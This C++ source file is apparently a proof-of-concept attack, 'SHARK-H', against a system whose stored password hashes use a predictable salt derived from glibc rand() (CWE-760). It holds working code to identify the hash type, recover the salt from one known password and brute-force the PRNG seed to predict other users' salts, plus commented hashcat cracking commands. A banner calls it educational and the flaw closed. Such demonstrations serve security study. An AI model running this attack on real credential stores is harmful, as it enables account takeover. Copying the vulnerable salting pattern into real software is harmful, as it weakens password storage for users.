#include <stdio.h>
#include <memory.h>
#include <string.h>
#include <string>
#include <iostream>
#include <iomanip>
#include <cctype>
#include <map>
#include <list>
#include <algorithm>
#include <fstream>
#include <cmath>
#include <ios>
#include <vector>

/*
 * PLEASE BE AWARE THAT THE VULNERABILITY HAS BEEN IDENTIFIED AND SUCCESSFULLY CLOSED.
 * NO KNOWN ATTACKS HAVE BEEN EXECUTED USING THIS VULNERABILITY AND NO DATA WAS OBTAINABLE BY THIRD PARTIES.
 * THE INFORMATION PRESENTED IS FOR EDUCATIONAL PURPOSES ONLY AND DOES NOT REPRESENT AN ONGOING RISK.
 */

/*
 * Salt-Hash Approximation Recovery-attack with Known plaintext. Hashcat variant (SHARK-H)
 *
 *                   _ ___                /^^\ /^\  /^^\_
 *       _          _@)@) \            ,,/ '` ~ `'~~ ', `\.
 *     _/o\_ _ _ _/~`.`...'~\        ./~~..,'`','',.,' '  ~:
 *    / `,'.~,~.~  .   , . , ~|,   ,/ .,' , ,. .. ,,.   `,  ~\_
 *   ( ' _' _ '_` _  '  .    , `\_/ .' ..' '  `  `   `..  `,   \_
 *    ~V~ V~ V~ V~ ~\ `   ' .  '    , ' .,.,''`.,.''`.,.``. ',   \_
 *     _/\ /\ /\ /\_/, . ' ,   `_/~\_ .' .,. ,, , _/~\_ `. `. '.,  \_
 *    < ~ ~ '~`'~'`, .,  .   `_: ::: \_ '      `_/ ::: \_ `.,' . ',  \_
 *     \ ' `_  '`_    _    ',/ _::_::_ \ _    _/ _::_::_ \   `.,'.,`., \-,-,-,_,_,
 *      `'~~ `'~~ `'~~ `'~~  \(_)(_)(_)/  `~~' \(_)(_)(_)/ ~'`\_.._,._,'_;_;_;_;_;
 *
 * This is a demonstrative(1) recovery attack with which any low privilege user of the system
 * can potentially steal user credentials and perform actions using a different identity,
 * this works by exploiting the password reset feature shortly after a finished update cycle
 * in order for the attacker to map possible prng seeds to hash salts for hash predictions.
 *
 * (1): Assumptions regarding the customer environment were made upfront,
 *      which might not be accurately representative.
 * Author: Alexander Töpfer (https://github.com/alexandertoepfer)
 * Artwork by (https://www.asciiart.eu/)
 */

/*
 * MIT License
 *
 * Copyright (c) [2023] [Alexander, Toepfer (https://github.com/alexandertoepfer)]
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE
 */

#include "sha256.hpp"
/*
 * Implementation of the SHA-256 hashing algorithm.
 * Auther is Brad Conte (brad AT bradconte.com)
 * Algorithm specification can be found here:
 * http://csrc.nist.gov/publications/fips/fips180-2/fips180-2withchangenotice.pdf
 */
#include "md5.hpp"
/*
 * Derived from the RSA Data Security, Inc. MD5 Message-Digest Algorithm
 * and modified slightly to be functionally identical but condensed into control structures.
 */
#include "aes128.hpp"
/*
 * Implementation of the AES algorithm, specifically ECB, CTR and CBC mode.
 * Block size can be chosen in aes128.hpp - available choices are AES128, AES192, AES256.
 * The implementation is verified against the test vectors in:
 * National Institute of Standards and Technology Special Publication 800-38A 2001 EDECB-AES128
 */
#include "utils.hpp"

enum hashtype {
  MD5,
  SHA256
};

/*
 * Algorithm to measure the distance between two words by the minimum number of single-character edits (insertions, deletions or substitutions)
 * required to change one word into the other, used approximate string matching to estimate magnitude of the applied salt, length analysis also sufficient.
 * https://en.wikipedia.org/wiki/Levenshtein_distance
 */
template<typename T>
requires requires(T x) {
  {x.c_str()} -> std::same_as<const char*>;
}
class levenshtein {
public:
  levenshtein(T& text) : value(text) {};
  T& value;
  std::map<int, T> distances;
  template<typename V, typename... U>
  levenshtein& distance(V var1, U... var2) {
    int i, j, len1, len2, track;
    int dist[500][500];
    const char* s1 = value.c_str();
    const char* s2 = var1.c_str();
    len1 = strlen(s1);
    len2 = strlen(s2);
    for(i = 0; i <= len1; i++) {
      dist[0][i] = i;
    }
    for(j = 0; j <= len2; j++) {
      dist[j][0] = j;
    }
    for(j = 1; j <= len1; j++) {
      for(i = 1; i <= len2; i++) {
        track = s1[i - 1] == s2[j - 1] ? 0 : 1;
        int t = (dist[i - 1][j] + 1) < (dist[i][j - 1] + 1) ? (dist[i - 1][j] + 1) : (dist[i][j - 1] + 1);
        dist[i][j] = t < (dist[i - 1][j - 1] + track) ? t : (dist[i - 1][j - 1] + track);
      }
    }
    this->distances.insert(std::pair<int,T>(dist[len2][len1], var1));
    this->distance(var2...);
    return *this;
  }
  levenshtein& distance() {
    return *this;
  }
  T closest(void) {
    int lowest = 999999;
    for(typename std::map<int, T>::iterator it = this->distances.begin(); it != this->distances.end(); ++it) {
      if(it->first < lowest)
        lowest = it->first;
    }
    return this->distances.find(lowest)->second;
  }
};

/*
 * Generic arithmetic hash class for calculations with hashes (hash + hash, hash - hash)
 * would have no use in cracking any other salting algorithm, when implemented using best practices.
 * https://auth0.com/blog/adding-salt-to-hashing-a-better-way-to-store-passwords/
 */
class am_hash {
public:
  std::string _hash = "";
  hashtype _type;
  am_hash() {}
  am_hash(const char* chr) {
    this->operator=(chr);
  }
  am_hash(am_hash&& move) : _hash(move._hash), _type(move._type) {}
  am_hash(const am_hash& move) : _hash(move._hash), _type(move._type) {}
  am_hash(hashtype type) : _type(type) {}
  am_hash& operator=(const char* hex) {
    std::string temp = hex;
    for(auto & c: temp)
      c = toupper(c);
    this->_hash = temp;
    return *this;
  }
  am_hash& operator=(const am_hash& other) {
    this->_hash = other._hash;
    this->_type = other._type;
    return *this;
  }
  am_hash& operator+(const char* hex) {
    std::string str = hex;
    for(auto & c: str)
      c = toupper(c);
    if(!this->_hash.empty()) {
      this->_hash = add_hex(this->_hash, str);
    }
    return *this;
  }
  am_hash& operator-(const char* hex) {
    std::string str = hex;
    for(auto & c: str)
      c = toupper(c);
          if(!this->_hash.empty()) {
      this->_hash = sub_hex(this->_hash, str);
    }
    return *this;
  }
  const char* c_str() {
    return this->_hash.c_str();
  }
  std::string& str() {
    return this->_hash;
  }
  const char* type() {
    return enum_str(this->_type);
  }
  const char* enum_str(hashtype n) {
    switch(n) {
      case hashtype::MD5:     return "md5$";
      case hashtype::SHA256:  return "sha256$";
    }
    return "";
  }
  std::string add_hex(std::string a, std::string b) {
    std::map<char, int> m = hex_value_of_dec();
    std::map<int, char> k = dec_value_of_hex();

    if(a.length() < b.length())
      swap(a, b);

    int len1 = a.length(), len2 = b.length();
    std::string ans = "";
    int carry = 0, i, j;

    for(i = len1 - 1, j = len2 - 1;
        j >= 0; i--, j--) {
      int sum = m[a[i]] + m[b[j]] + carry;
      int addition_bit = k[sum % 16];
      ans.push_back(addition_bit);
      carry = sum / 16;
    }
    while(i >= 0) {
      int sum = m[a[i]] + carry;
      int addition_bit = k[sum % 16];
      ans.push_back(addition_bit);
      carry = sum / 16;
      i--;
    }
    if(carry) {
      ans.push_back(k[carry]);
    }
    std::reverse(ans.begin(), ans.end());
    return ans;
  }
  std::string sub_hex(std::string a, std::string b) {
    std::map<char, int> m = hex_value_of_dec();
    std::map<int, char> k = dec_value_of_hex();

    int len1 = a.length(), len2 = b.length();
    std::string ans = "";
    int carry = 0, y, z;

    for(y = len1 - 1, z = len2 - 1;
        z >= 0; y--, z--) {
       int sum = m[a[y]] - m[b[z]] - carry;
            if(sum < 0) {
                sum = m[a[y]] + 16 - m[b[z]] - carry;
                carry = 1;
            } else carry = 0;
      int addition_bit = k[sum % 16];
      ans.push_back(addition_bit);
    }
    while(y >= 0) {
      int sum = m[a[y]] - carry;
            if(sum < 0) {
                sum = m[a[y]] + 16 - carry;
                carry = 1;
            } else carry = 0;
      int addition_bit = k[sum % 16];
      ans.push_back(addition_bit);
      y--;
    }
    if(carry) {
      ans.push_back(k[carry]);
    }
    std::reverse(ans.begin(), ans.end());
    return ans;
  }
  std::map<char, int> hex_value_of_dec(void) {
    std::map<char, int> map {
      { '0', 0 }, { '1', 1 },
      { '2', 2 }, { '3', 3 },
      { '4', 4 }, { '5', 5 },
      { '6', 6 }, { '7', 7 },
      { '8', 8 }, { '9', 9 },
      { 'A', 10 }, { 'B', 11 },
      { 'C', 12 }, { 'D', 13 },
      { 'E', 14 }, { 'F', 15 }
    };
    return map;
  }
  std::map<int, char> dec_value_of_hex(void) {
    std::map<int, char> map {
      { 0, '0' }, { 1, '1' },
      { 2, '2' }, { 3, '3' },
      { 4, '4' }, { 5, '5' },
      { 6, '6' }, { 7, '7' },
      { 8, '8' }, { 9, '9' },
      { 10, 'A' }, { 11, 'B' },
      { 12, 'C' }, { 13, 'D' },
      { 14, 'E' }, { 15, 'F' }
    };
    return map;
  }
};

template<typename T>
requires requires(T x) {
  {x = x.c_str()} -> std::same_as<T&>;
}
class sha256 {
public:
  sha256() {}
  T operator()(std::string text) {
    T hash(hashtype::SHA256);
    const BYTE* text1 = (unsigned char*)text.c_str();
    BYTE buf[SHA256_BLOCK_SIZE];
    SHA256_CTX sctx;

    sha256_init(&sctx);
    sha256_update(&sctx, text1, text.size());
    sha256_final(&sctx, buf);

    std::ostringstream convert;
    for(int a = 0; a < SHA256_BLOCK_SIZE; a++) {
      convert << std::setfill('0') << std::setw(2) << std::uppercase << std::hex << (int)buf[a];
    }
    hash = convert.str().c_str();
    return hash;
  }
};

template<typename T>
requires requires(T x) {
  {x = x.c_str()} -> std::same_as<T&>;
}
class md5 {
public:
  md5() {}
  T operator()(std::string text) {
    T hash(hashtype::MD5);
    uint8_t* res = md5String((char*)text.c_str());
    std::ostringstream convert;
    for(int a = 0; a < 16; a++) {
      convert << std::setfill('0') << std::setw(2) << std::uppercase << std::hex << (int)res[a];
    }
    hash = convert.str().c_str();
    return hash;
  }
};

class aes128 {
public:
  aes128() {}
  std::string encrypt(std::string& text, std::string& key) {
    struct AES_ctx actx;
    pad(text, key);
    uint8_t iv[]  = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f};
    uint8_t* k = (uint8_t*)key.c_str();
    uint8_t* t = (uint8_t*)text.c_str();
    AES_init_ctx_iv(&actx, k, iv);
    AES_CBC_encrypt_buffer(&actx, t, text.size());
    return string_to_hex(text);
  }
  std::string decrypt(std::string& text, std::string& key) {
    struct AES_ctx actx;
    pad(text, key);
    uint8_t iv[]  = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f};
    text = hex_to_string(text);
    uint8_t* k = (uint8_t*)key.c_str();
    uint8_t* c = (uint8_t*)text.c_str();
    AES_init_ctx_iv(&actx, k, iv);
    AES_CBC_decrypt_buffer(&actx, c, text.size());
    return text;
  }
  void pad(std::string& text, std::string& key) {
    for(int i = 0; text.size() % 16; i++) {
      text.append(std::string(1, (char)1));
    }
    for(int i = 0; key.size() % 16; i++) {
      key.append(std::string(1, (char)1));
    }
  }
};

/*
 * Calculate the exact salt used to obscure the hash.
 *
 * @param hash Original hash before it was ever modified,
 *             (we have to have one unmodified hash at least)
 * @param salt Obscured hash after the salt was added.
 * @param out Constant which was added.
 */
template<typename T>
requires requires(T x) {
  {x.str()} -> std::same_as<std::string&>;
  {x = x.c_str()} -> std::same_as<T&>;
}
T bit_mask(T& hash, T& salt, std::string& out) {
  std::string result, number_x, number_y;
  std::stringstream convert;
  unsigned long z;
  bool lock = false;
  size_t i;
  for(i = 0; i < hash.str().size(); i++)
    if((toupper(hash.str()[i]) == toupper(salt.str()[i])) && !lock)
      result.append("0");
    else {
      result.append("*");
      number_x += salt.str()[i];
      number_y += hash.str()[i];
      lock = true;
    }
  z = hexs_to_ul(number_x) - hexs_to_ul(number_y);
  convert << std::dec << z;
  out = convert.str();
  T res = result.c_str();
  res._type = hash._type;
  return res;
}

/*
 * Linear congruential generator solver predicting random numbers
 * based on a discontinuous piecewise linear equation, will be used
 * to crack GLIBC's rand() pseudo-random number generator.
 * https://www.mathstat.dal.ca/~selinger/random/
 */
class lcgs {
public:
  int r[344+10];
  std::vector<int> a;
  int i, j, s;
  lcgs() : a(10) {}
  std::vector<int>& operator()(int rand) {
    for(int i = 0; i < 20000000; i++) {
      std::vector<int>& p = fast_rand(i);
      std::vector<int>::iterator t = std::find(std::begin(p), std::end(p), rand);
      bool exists = t != std::end(p);
      if(exists) {
        j = t - std::begin(p);
        s = i;
        break;
      }
    }
    return a;
  }
  std::vector<int>& rand() {
    fast_rand(s);
    return a;
  }
  int seed() {
    return s;
  }
  lcgs& seed(int seed) {
    s = seed;
    return *this;
  }
  int index() {
    return j;
  }
  int mask() {
    double ret = 0;
    for(int k = 0; k < 10; k++) {
      ret += ul_to_hexs(a[k]).length();
    }
    ret = std::ceil(ret / 10);
    if((int)ret % 2)
      ret += 1;
    return (int)ret;
  }
  std::vector<int>& fast_rand(int seed) {
    r[0] = seed;
    /*
     * n = a*n' mod m (+c)
     */
    for (i=1; i<31; i++) {
      r[i] = (16807LL * r[i-1]) % 2147483647;
      if (r[i] < 0) {
        r[i] += 2147483647;
      }
    }
    for (i=31; i<34; i++) {
      r[i] = r[i-31];
    }
    for (i=34; i<344; i++) {
      r[i] = r[i-31] + r[i-3];
    }
    for (i=344; i<344+10; i++) {
      r[i] = r[i-31] + r[i-3];
      a[i-344] = ((unsigned int)r[i]) >> 1;
    }
    return a;
  }
};

/*
 * Get keys and values from JSON string to insert into map.
 *
 * @param text JSON string with named object which is skipped.
 * @return allocated map filled with user entries, unfortunate pointer.
 */
std::map<std::string, std::string>* users(std::string& text) {
  auto map = new std::map<std::string, std::string>;
  nextqtd(text); // move cursor to first username
  for(int i = 0; i < 4; i++) {
    std::string key = nextqtd(text), val = nextqtd(text);
    map->insert(std::pair<std::string,std::string>(key, val));
  }
  return map;
}

int main() {
  lcgs lcgs;
  sha256<am_hash> sha256;
  md5<am_hash> md5;
  aes128 aes128;

  //$aes128.key = MyKey123
  //mode = am_hash($pass) + $salt.rand
  //hash = hash + ul_to_hexs(rand()).c_str(); -> am_hash($pass = X)
  //$salt.rand = hash - am_hash($pass = X); -> $salt.rand.seed

  /*
   * Vulnerable code snippet
   *
   * srand(time(NULL)); //=> srand(16743298)
   * rand(); rand();
   * std::string key = "MyKey123";
   * am_hash h1 = "?", h2 = "?", h3 = "?";
   * h1 = h1 + ul_to_hexs(rand()).c_str();
   * h2 = h2 + ul_to_hexs(rand()).c_str();
   * h3 = h3 + ul_to_hexs(rand()).c_str();
   * std::string json = "{\n\
   * \"USERS\": {\n\
   *   \"USER1\": \"" + h1.c_str() + "\",\n\
   *   \"USER2\": \"" + h2.c_str() + "\",\n\
   *   \"USER3\": \"" + h3.c_str() + "\",\n\
   * }\n}";
   * std::cout << format(aes128.encrypt(json, key)) << std::endl;
   */

  std::string key = "?";
  std::ifstream f("data.js.aes");
  std::stringstream buffer;
  buffer << f.rdbuf();
  std::string text = unformat(buffer.str());
  text = aes128.decrypt(text, key);
  std::cout << text << std::endl;

  // Attack: CWE-760 Use of a One-Way Hash with a Predictable Salt
  //am_hash($pass) + $salt.prng =>
  //am_hash($pass append $salt.crng)
  if(false) {
    std::map<std::string, std::string>& map = *users(text);
    std::string p = "test1234";

    //$pass_n = am_hash^-1(am_hash($pass) - $salt.rand);
    am_hash d, h = map["USER1"].c_str(), // p = test1234
            h2 = map["USER2"].c_str(), // p = ?
            h3 = map["USER3"].c_str(); // p = ?

    am_hash b = sha256(p);
    am_hash c = md5(p);

    levenshtein l(h);
    am_hash r = l.distance(b, c).closest();
    std::cout << r.type() << r.c_str() << std::endl;

    std::string o = "";
    am_hash m = bit_mask(r, h, o);
    std::cout << m.type() << m.c_str() << std::endl;
    std::cout << o << std::endl << std::endl;

    d = h2;
    // Problem solve the seed of the prng ~20 hours
    //$salt.rand.seed = 2,147,483,647
    //42 hours
    std::vector<int>& n = lcgs(std::stoi(o));
    std::cout << lcgs.seed() << std::endl;
    for(auto& i : n) {
        d = h2;
        // Hash guesses based on prng prediction
        am_hash s = d - ul_to_hexs(i).c_str();
        std::cout << s.str() << std::endl;
    }
    d = h3;
    for(auto& i : n) {
        d = h3;
        am_hash s = d - ul_to_hexs(i).c_str();
        std::cout << s.str() << std::endl;
    }

    // Salt magnitude prediction for attack via partial match
    lcgs.seed(std::stoi(o)).rand();
    std::cout << std::endl <<
      h2.str().
      substr(0, h2.str().length() - lcgs.mask()).
      append(lcgs.mask(), '*') << std::endl;
    std::cout << h3.str().
                 substr(0, h3.str().length() - lcgs.mask()).
                 append(lcgs.mask(), '*') << std::endl;
  }

  // Hashcat strategies used to compromise accounts:
  //hashcat.exe -m 0 ./md5_salt_guess.hash -a 0 ./rockyou-extended.dict &
  //hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -1 "!$??" ./rockyou-extended ?1
  //hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -1 "@#%&*" ./rockyou-extended ?1
  //hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -1 "12347890" -2 "!$??" ./rockyou-extended ?1?2

  return 0;
}
